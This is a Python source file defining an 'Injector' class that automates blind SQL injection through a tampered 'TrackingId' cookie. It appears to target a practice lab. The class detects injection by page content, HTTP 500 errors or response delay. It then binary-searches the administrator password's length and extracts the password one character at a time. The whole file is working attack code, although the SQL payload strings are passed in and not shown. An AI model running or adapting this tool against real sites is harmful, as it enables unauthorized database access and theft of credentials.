import requests
import sys
from bs4 import BeautifulSoup
import threading

class Injector:

    def __init__(
        self, 
        url:str, 
        poison:dict,
        length_scope=20,
        conditional=False, 
        error_induction=False, 
        time_delay=False
    ) -> None:

        assert not all((conditional, error_induction,time_delay)), 'can only inject using either'
        assert any((conditional, error_induction, time_delay)), 'injection type requred'

        self.session = requests.Session()
        
        self.url = url
        
        self.poison_stash = poison
        
        self.cookies = self.session.cookies.get_dict()
        
        self.length_scope = int(length_scope)
        
        self.password_found = None

        self.thread_lock = threading.Lock()
        
        try:

            self.session.get(self.url)

        except requests.exceptions.RequestException:

            print(f'(+) Unable to make a request to {self.url}')

            sys.exit()

        if conditional:

            self.injection_type = 1

        if error_induction:

            self.injection_type = 2

        if time_delay:

            self.injection_type = 3

        assert self.inject_payload(poison['boolean_condition'])

    def __update_password(self, pos:int, character:str):

        with self.thread_lock:

            self.password_found[pos] = character

    def poison_cookie(self, poison:str):

        cookies = self.session.cookies.get_dict().copy()

        cookies["TrackingId"] = "{}{}".format(cookies["TrackingId"], poison)

        return cookies
    
    def __inject_time_delay_payload(self, payload:str)->bool:

        try:

            self.session.get(
                url=self.url,
                cookies=self.poison_cookie(poison=payload),
                timeout=5
            )

        except requests.exceptions.Timeout:

            return True

        return False

    def __inject_conditional_payload(self, payload:str)->bool:

        response = self.session.get(
            url=self.url,
            cookies=self.poison_cookie(poison=payload)
        )

        soup = BeautifulSoup(response.text, 'html.parser')
        return True if soup.find(string='Welcome back!') is not None else False

    def __inject_error_induction_payload(self, payload:str)->bool:

        response = self.session.get(
            url=self.url,
            cookies=self.poison_cookie(poison=payload)
        )

        return True if response.status_code == 500 else False
    
    def inject_payload(self, payload:str)->bool:

        if self.injection_type == 1:

            return self.__inject_conditional_payload(payload=payload)

        if self.injection_type == 2:

            return self.__inject_error_induction_payload(payload=payload)

        if self.injection_type == 3:

            return self.__inject_time_delay_payload(payload=payload)


    def __query_password_length(self, length:int)->int:

        if self.inject_payload(
            payload=self.poison_stash['admin_password_limit'].format("<", length)
        ):

            return 1

        if self.inject_payload(
            payload=self.poison_stash['admin_password_limit'].format(">", length)
        ):

            return -1

        return 0

    def find_password_length(self):

        pass_length, low, high = None, 0, self.length_scope

        print('Enumerating password length')

        while low <= high:

            print(f'Estimating password length between {low} and {high}')

            mid = sum((low, high)) // 2

            answ = self.__query_password_length(length=mid)

            if answ > 0:

                high = mid -1

            if answ < 0:

                low = mid +1

            if answ == 0:

                pass_length = mid

                print(f'Password length: {pass_length}')

                break

        self.password_found = ['']*pass_length

        return pass_length

    def __password_char_finder(self, position:int, ascii_code:int) -> int:

        if self.inject_payload(
            payload=self.poison_stash["password_harvester"].format(position, "<", ascii_code)
        ):
            return 1
        
        if self.inject_payload(
            payload=self.poison_stash["password_harvester"].format(position, ">", ascii_code)
        ):

            return -1

        return 0

    def harvest_password(self, character_info:dict)->int:

        low, high, character = 36, 126, None

        while low <=high:

            mid = sum((low, high)) // 2

            answ = self.__password_char_finder(
                position=character_info['position'],
                ascii_code=mid
            )

            if answ > 0:

                high = mid -1

            if answ < 0:

                low = mid + 1

            if answ == 0:

                character = chr(mid)

                print(f"Got {character} for pos: {character_info['position']}")

                self.__update_password(
                    pos=character_info['position']-1,
                    character=character
                )
                break
            
        return character

